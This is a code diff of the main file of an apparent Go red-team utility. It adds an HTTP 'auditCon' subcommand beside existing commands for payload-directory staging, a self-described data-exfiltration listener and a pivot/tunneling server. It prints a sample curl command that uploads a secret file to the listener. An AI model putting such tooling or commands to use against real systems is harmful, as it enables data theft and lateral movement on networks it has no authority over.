@@ -10,6 +10,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"time"
 )
 
 func main(){
@@ -59,6 +60,12 @@ func main(){
 	tunnelTarget := tunnelOption.String("u", "", "Specifies the target of the tunnel")
 	tunnelPort := tunnelOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")
 
+	// Stores the flagset for the tunnel commands
+	auditOption := flag.NewFlagSet("auditCon", flag.ExitOnError)
+
+	// Stores the flag for the function
+	auditTarget := auditOption.String("u", "", "Specifies the URL to target")
+
 
 	// Checks if the user has provided a subcommand
 	if len(os.Args) < 2 {
@@ -70,107 +77,139 @@ func main(){
 
 	// Switch to select the command to be used
 	switch os.Args[1] {
-	case "stageDir":
-		// Parse the flags starting from the 3rd argument (index 2)
-		stageDirectoryOption.Parse(os.Args[2:])
+		case "stageDir":
+			// Parse the flags starting from the 3rd argument (index 2)
+			stageDirectoryOption.Parse(os.Args[2:])
 
-		// Cleans the file path
-		cleanPort := sanitation.CleanPort(*stageDirectoryPort)
+			// Cleans the file path
+			cleanPort := sanitation.CleanPort(*stageDirectoryPort)
 
-		// Stores the result of the port validation
-		portNumberValid := validation.ValidatePort(cleanPort)
+			// Stores the result of the port validation
+			portNumberValid := validation.ValidatePort(cleanPort)
 
-		// Checks if the number is not valid
-		if !portNumberValid {
-			// Logs the error
-			log.Fatalf("Invalid port: %s", *stageDirectoryPort)
-		}
+			// Checks if the number is not valid
+			if !portNumberValid {
+				// Logs the error
+				log.Fatalf("Invalid port: %s", *stageDirectoryPort)
+			}
 
-		// Sanitises the file path
-		cleanPath := sanitation.CleanFilePath(*stageDirectoryDir)
+			// Sanitises the file path
+			cleanPath := sanitation.CleanFilePath(*stageDirectoryDir)
 
-		// Stores the result and cleaned version of the validate port
-		cleanDir, dirValid := validation.ValidateFilePath(cleanPath)
+			// Stores the result and cleaned version of the validate port
+			cleanDir, dirValid := validation.ValidateFilePath(cleanPath)
 
-		// Checks if the directory is not valid
-		if !dirValid {
-			// Logs the error
-			log.Fatalf("Invalid directory: %s", *stageDirectoryDir)
-		}
+			// Checks if the directory is not valid
+			if !dirValid {
+				// Logs the error
+				log.Fatalf("Invalid directory: %s", *stageDirectoryDir)
+			}
 
-		cleanSource, sourceValid := validation.ValidateFilePath(*stageDirectorySource)
+			cleanSource, sourceValid := validation.ValidateFilePath(*stageDirectorySource)
 
-		// Checks if the directory is not valid
-		if !sourceValid {
-			// Logs the error
-			log.Fatalf("Invalid directory: %s", *stageDirectorySource)
-		}
+			// Checks if the directory is not valid
+			if !sourceValid {
+				// Logs the error
+				log.Fatalf("Invalid directory: %s", *stageDirectorySource)
+			}
 
-		// Passes the flags into the function
-		essentail.StagePayloadDirectory(*stageDirectoryPort, cleanDir, cleanSource)
-	case "uploadFile":
-		// Parse the flags
-		uploadFilesOption.Parse(os.Args[2:])
+			// Passes the flags into the function
+			essentail.StagePayloadDirectory(*stageDirectoryPort, cleanDir, cleanSource)
+		case "uploadFile":
+			// Parse the flags
+			uploadFilesOption.Parse(os.Args[2:])
 
-		// Cleans the port number
-		cleanPort := sanitation.CleanPort(*uploadFilesPort)
+			// Cleans the port number
+			cleanPort := sanitation.CleanPort(*uploadFilesPort)
 
-		// Stores the result of the port validation
-		portNumberValid := validation.ValidatePort(cleanPort)
+			// Stores the result of the port validation
+			portNumberValid := validation.ValidatePort(cleanPort)
 
-		// Checks if the number is not valid
-		if !portNumberValid {
-			// Logs the error
-			log.Fatalf("Invalid port: %s", *uploadFilesPort)
-		}
+			// Checks if the number is not valid
+			if !portNumberValid {
+				// Logs the error
+				log.Fatalf("Invalid port: %s", *uploadFilesPort)
+			}
 
-		// Checks if the url is valid 
-		_, err := validation.ValidateURL(*uploadFilesUrlPath)
+			// Checks if the url is valid 
+			_, err := validation.ValidateURL(*uploadFilesUrlPath)
 
-		// Checks if there is errors
-		if err != nil{
-			fmt.Println(err)
-		} 
+			// Checks if there is errors
+			if err != nil{
+				fmt.Println(err)
+			} 
 
-		// Handles the function
-		http.HandleFunc(*uploadFilesUrlPath, essentail.UploadHandler)
+			// Handles the function
+			http.HandleFunc(*uploadFilesUrlPath, essentail.UploadHandler)
 
-		// Prints information about the path
-		fmt.Println("[*] Data Exfiltration Listener active on port 9000")
-		fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
+			// Prints information about the path
+			fmt.Println("[*] Data Exfiltration Listener active on port 9000")
+			fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
+			
+			// Listens and serves the server
+			if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
+				log.Fatal(err)
+			}
+		case "tunnel":
+			// Parses the flags
+			tunnelOption.Parse(os.Args[2:])
+
+			// Checks if the url is valid 
+			_, err := validation.ValidateURL(*tunnelTarget)
+
+			// Checks if there is errors
+			if err != nil{
+				fmt.Println(err)
+			} 
+
+			// Cleans the port number
+			cleanPort := sanitation.CleanPort(*tunnelPort)
+
+			// Stores the result of the port validation
+			portNumberValid := validation.ValidatePort(cleanPort)
+
+			// Checks if the number is not valid
+			if !portNumberValid {
+				// Logs the error
+				log.Fatalf("Invalid port: %s", *tunnelPort)
+			}
+
+			// Handles the function for tunnel
+			http.HandleFunc("/", essentail.HandleTunnel(*tunnelTarget))
+			// Outputs information about whats going on
+			log.Println("[*] Pivot/Tunneling Server active on port", *tunnelPort)
+			log.Fatal(http.ListenAndServe(":"+*tunnelPort, nil))
 		
-		// Listens and serves the server
-		if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
-			log.Fatal(err)
-		}
-	case "tunnel":
-		// Parses the flags
-		tunnelOption.Parse(os.Args[2:])
+		case "auditCon":
+			// Parses the flag
+			auditOption.Parse(os.Args[2:])
 
-		// Checks if the url is valid 
-		_, err := validation.ValidateURL(*tunnelTarget)
+			// Checks if the url is valid 
+			_, err := validation.ValidateURL(*auditTarget)
 
-		// Checks if there is errors
-		if err != nil{
-			fmt.Println(err)
-		} 
+			// Checks if there is errors
+			if err != nil{
+				fmt.Println(err)
+			}
+			
+			// Ouputs the audit is starting
+			fmt.Printf("[*] Launching configuration audit against: %s\n", *auditTarget)
 
-		// Cleans the port number
-		cleanPort := sanitation.CleanPort(*tunnelPort)
+			// Defines a client with a strict timeout so your program doesn't hang forever
+			client := &http.Client{
+				Timeout: 10 * time.Second,
+			}
 
-		// Stores the result of the port validation
-		portNumberValid := validation.ValidatePort(cleanPort)
+			// 3. Send the active HTTP request
+			resp, err := client.Get(*auditTarget)
+			
+			// Catches the error
+			if err != nil {
+				log.Fatalf("[!] Connection failed: %v\n", err)
+			}
+			defer resp.Body.Close() // Clean up the connection pool when finished
 
-		// Checks if the number is not valid
-		if !portNumberValid {
-			// Logs the error
-			log.Fatalf("Invalid port: %s", *tunnelPort)
-		}
-
-		// Handles the function for tunnel
-		http.HandleFunc("/", essentail.HandleTunnel(*tunnelTarget))
-		// Outputs information about whats going on
-		log.Println("[*] Pivot/Tunneling Server active on port", *tunnelPort)
-		log.Fatal(http.ListenAndServe(":"+*tunnelPort, nil))
+			// 4. Pass the response object directly into your audit logger function
+			essentail.AuditRequest(resp)
 	}
 }
